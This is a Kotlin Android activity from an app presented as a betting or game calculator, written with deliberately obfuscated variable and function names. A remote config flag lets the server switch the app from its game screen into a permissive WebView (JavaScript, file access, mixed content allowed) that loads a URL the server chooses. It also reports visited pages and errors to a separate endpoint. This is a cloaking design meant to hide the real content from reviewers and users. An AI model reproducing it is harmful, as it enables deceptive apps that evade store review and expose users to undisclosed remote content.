package com.app.bet.stav.game.calc

import android.graphics.Bitmap
import android.os.Build
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import android.view.KeyEvent
import android.view.View
import android.view.animation.Animation
import android.view.animation.AnimationUtils
import android.webkit.*
import android.widget.Toast
import androidx.annotation.RequiresApi
import com.android.volley.Request
import com.android.volley.toolbox.JsonObjectRequest
import com.android.volley.toolbox.Volley
import com.app.bet.stav.game.calc.databinding.ActivityMainBinding
import com.app.bet.stav.game.calc.fragments.menu
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings
import org.json.JSONObject
import java.util.*

lateinit var bindings: ActivityMainBinding
class MainActivity : AppCompatActivity() {
    var ljfnfsfsad: String? = null
    var hgsdfgdrhd: String? = null
    var ksdmfdsfsfds: Boolean = false
    lateinit var difjndsfdsfdsf: FirebaseRemoteConfig

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        bindings = ActivityMainBinding.inflate(layoutInflater)
        setContentView(bindings.root)
        supportFragmentManager
            .beginTransaction()
            .replace(bindings.gameView.id, menu())
            .commit()


val anim = AnimationUtils.loadAnimation(this,R.anim.animashion)
bindings.text.startAnimation(anim)
        anim.setAnimationListener(object : Animation.AnimationListener{
            override fun onAnimationStart(p0: Animation?) {

            }

            override fun onAnimationEnd(p0: Animation?) {
dfsanmdmsfdsdad()
            }

            override fun onAnimationRepeat(p0: Animation?) {

            }
        })




    }

    private fun dfsanmdmsfdsdad() {
        difjndsfdsfdsf = FirebaseRemoteConfig.getInstance()
        val dbfdsgfgasgtrgfdaf = FirebaseRemoteConfigSettings.Builder().setMinimumFetchIntervalInSeconds(3600).build()
        difjndsfdsfdsf.setConfigSettingsAsync(dbfdsgfgasgtrgfdaf)
        difjndsfdsfdsf.setDefaultsAsync(R.xml.remote_config_defaults)
        difjndsfdsfdsf.fetchAndActivate()
            .addOnCompleteListener(this) { task ->
                if (task.isSuccessful) {
                    val faregdfgrfgfdgrgadsgadg: Boolean = difjndsfdsfdsf.getBoolean("view")
                    if (faregdfgrfgfdgrgadsgadg == true) {
                        ljfnfsfsad = difjndsfdsfdsf.getString("ssilka")
                        hgsdfgdrhd = difjndsfdsfdsf.getString("ssilka2")

                        gfsdsbfgbfbfdbsrtbfbs()
                        bsgrtbgtbgftbbt()


                    } else {
                        bindings.gameView.visibility = View.VISIBLE
                        bindings.webviews.visibility = View.GONE
                        bindings.progress.visibility = View.GONE
                        bindings.text.visibility = View.GONE
                    }

                } else {
                    Toast.makeText(this, "check internet", Toast.LENGTH_SHORT).show()

                }

            }
    }

    private fun bsgrtbgtbgftbbt() {
        Log.d("tyttyt2", "tyttyt2")

        val vfdbgsfbgfbfbs = Volley.newRequestQueue(this)
        val jksndfijksgndgfdjg = JSONObject()
        jksndfijksgndgfdjg.put("appsFlyerId", "id")
        jksndfijksgndgfdjg.put("apsInfo", "parametr")
        var fafvdsfrafdsafgfdsfasdf = ljfnfsfsad
        val shufdjkfikjdlfiklgmfsf = object: JsonObjectRequest(
            Request.Method.POST, fafvdsfrafdsafgfdsfasdf, jksndfijksgndgfdjg,
            { response ->
                if(response.getBoolean("success")) {
                    Log.d("tyttyt3", "tyttyt3")

                    ksdmfdsfsfds = true
                    bindings.webviews.settings.javaScriptEnabled = true
                    bindings.webviews.settings.domStorageEnabled = true
                    bindings.webviews.settings.useWideViewPort = true
                    bindings.webviews.settings.loadWithOverviewMode = true
                    bindings.webviews.settings.allowFileAccess = true
                    bindings.webviews.settings.javaScriptCanOpenWindowsAutomatically = true
                    bindings.webviews.settings.setSupportMultipleWindows(false)
                    bindings.webviews.settings.displayZoomControls = false
                    bindings.webviews.settings.builtInZoomControls = true
                    bindings.webviews.settings.setSupportZoom(true)
                    bindings.webviews.settings.pluginState = WebSettings.PluginState.ON
                    bindings.webviews.settings.mixedContentMode = 0
                    bindings.webviews.settings.allowContentAccess = true
                    CookieManager.getInstance().setAcceptCookie(true)
                    CookieManager.getInstance().setAcceptThirdPartyCookies( bindings.webviews, true)

                    bindings.webviews.webViewClient = object : WebViewClient() {
                        override fun onPageStarted(etgdrfvdcs: WebView?, jhngbfdr: String?, ytgdfvdewfrgt: Bitmap?) {
                            super.onPageStarted(etgdrfvdcs, jhngbfdr, ytgdfvdewfrgt)

                        }

                        override fun onPageFinished(trytdfds: WebView, ythgfdgthy: String) {
                            bindings.webviews.visibility = View.VISIBLE
                            bindings.gameView.visibility = View.GONE
                            bindings.progress.visibility = View.GONE

                            bindings.text.visibility = View.GONE
                            dogsjkfgidogflksfd(ythgfdgthy)

                        }

                        override fun onReceivedHttpError(
                            dhjkijhgf: WebView?,
                            fdgyuiohgfvd: WebResourceRequest?,
                            rtyyhgrferujyht: WebResourceResponse?
                        ) {
                            super.onReceivedHttpError(dhjkijhgf, fdgyuiohgfvd, rtyyhgrferujyht)
                            thgfdgfhgjukfgdfs( rtyyhgrferujyht!!.statusCode.toString())

                        }

                        @RequiresApi(Build.VERSION_CODES.M)
                        override fun onReceivedError(yhgbfvdsxdcfg: WebView?, hwfsbdahfdjkgbhdf: WebResourceRequest?, rrvkhjfdbuhsjfbuhdabjd: WebResourceError?) {
                            super.onReceivedError(yhgbfvdsxdcfg, hwfsbdahfdjkgbhdf, rrvkhjfdbuhsjfbuhdabjd)
                            thgfdgfhgjukfgdfs( rrvkhjfdbuhsjfbuhdabjd.toString())
                        }
                    }
                    bindings.webviews.loadUrl(response.getString("url"))

                }
                else{
                    bindings.webviews.visibility = View.GONE
                    bindings.gameView.visibility = View.VISIBLE
                    bindings.progress.visibility = View.GONE
                    bindings.text.visibility = View.GONE

                }
            }, { error ->
                bindings.webviews.visibility = View.GONE
                bindings.progress.visibility = View.GONE
                bindings.gameView.visibility = View.VISIBLE
                bindings.text.visibility = View.GONE

            }
        ) {
            override fun getHeaders(): Map<String, String> {
                val fwevfdafdgrdffargfdargsdfrefSDF: MutableMap<String, String> = HashMap()
                fwevfdafdgrdffargfdargsdfrefSDF["Device-UUID"] = "ttrreekk"!!
                return fwevfdafdgrdffargfdargsdfrefSDF
            }
        }
        vfdbgsfbgfbfbs.add(shufdjkfikjdlfiklgmfsf)
    }

    private fun thgfdgfhgjukfgdfs(toString: String) {
        val ytegrfewadfr = Volley.newRequestQueue(this)
        val iuybfnhgbfvv = JSONObject()
        iuybfnhgbfvv.put("name", "a_e_w")
        val sjrhngkfshnjgfshh = JSONObject()
        sjrhngkfshnjgfshh.put("success", true)
        sjrhngkfshnjgfshh.put("url", ljfnfsfsad)
        sjrhngkfshnjgfshh.put("error", toString)

        iuybfnhgbfvv.put("data", sjrhngkfshnjgfshh)
        iuybfnhgbfvv.put("created", huretrgfhehrt())
        var utirhdjkfgdfhfgh = hgsdfgdrhd

        val hrtstrhjysthyrtsh = object: JsonObjectRequest(
            Request.Method.POST, utirhdjkfgdfhfgh, iuybfnhgbfvv,
            { response ->

            }, { error ->

            }
        ) {
            override fun getHeaders(): Map<String, String> {
                val sghjbkdfgsdajhkjsf: MutableMap<String, String> = java.util.HashMap()
                sghjbkdfgsdajhkjsf["Device-UUID"] = "fly"!!
                return sghjbkdfgsdajhkjsf
            }
        }
        ytegrfewadfr.add(hrtstrhjysthyrtsh)
    }

    private fun dogsjkfgidogflksfd(dsfgersfd: String) {

        val hyjuyhtgrfdrgt = Volley.newRequestQueue(this)
        val iuyhftgrfdgrthy = JSONObject()
        iuyhftgrfdgrthy.put("name", "a_p_f")
        val jyhtgfdgthyj = JSONObject()
        jyhtgfdgthyj.put("success", true)
        jyhtgfdgthyj.put("url", dsfgersfd)
        iuyhftgrfdgrthy.put("data", jyhtgfdgthyj)
        iuyhftgrfdgrthy.put("created", huretrgfhehrt())
        var oiujhgyyyyygf = hgsdfgdrhd


        val jkdgfklgkspgjdbdg = object: JsonObjectRequest(
            Request.Method.POST, oiujhgyyyyygf, iuyhftgrfdgrthy,
            { response ->
            }, { error ->
            }
        ) {
            override fun getHeaders(): Map<String, String> {
                val iidkgjibjirslf: MutableMap<String, String> = java.util.HashMap()
                iidkgjibjirslf["Device-UUID"] = "tyrerfdsg"!!
                return iidkgjibjirslf
            }
        }
        hyjuyhtgrfdrgt.add(jkdgfklgkspgjdbdg)
    }


    private fun gfsdsbfgbfbfdbsrtbfbs() {

        val etgrsfdghrjuyytegrf = Volley.newRequestQueue(this)
        val gyethrgfergh = JSONObject()
        gyethrgfergh.put("name", "a_o")
        val xvgfhyethrgdf = JSONObject()
        xvgfhyethrgdf.put("success", true)
        gyethrgfergh.put("data", xvgfhyethrgdf)
        gyethrgfergh.put("created", huretrgfhehrt())
        var eregtrhjyytr = hgsdfgdrhd
        val wesdfghjuyytgrf = object: JsonObjectRequest(
            Request.Method.POST, eregtrhjyytr, gyethrgfergh,
            { response ->

            }, { error ->

            }
        ) {
            override fun getHeaders(): Map<String, String> {
                val lfkghrgkfhlkgdg: MutableMap<String, String> = HashMap()
                lfkghrgkfhlkgdg["Device-UUID"] = "phone"
                Log.d("IDDEVICE", "phone")
                return lfkghrgkfhlkgdg
            }
        }
        etgrsfdghrjuyytegrf.add(wesdfghjuyytgrf)
    }

    private fun huretrgfhehrt(): String {
        val theytrgfdsgdg: Date = Calendar.getInstance().time
        return theytrgfdsgdg.time.toString()
    }
    override fun onKeyDown(gtrfdsgtgferg: Int, etyrgsfdddddddhhdrgfdg: KeyEvent?): Boolean {
        if ((gtrfdsgtgferg == KeyEvent.KEYCODE_BACK) && bindings.webviews.canGoBack()) {
            bindings.webviews.goBack()
            return true
        }

        return super.onKeyDown(gtrfdsgtgferg, etyrgsfdddddddhhdrgfdg)
    }
    override fun onBackPressed() {
        if ( bindings.webviews.isFocused() &&  bindings.webviews.canGoBack()) {
            bindings.webviews.goBack()
        } else {
        }
    }
}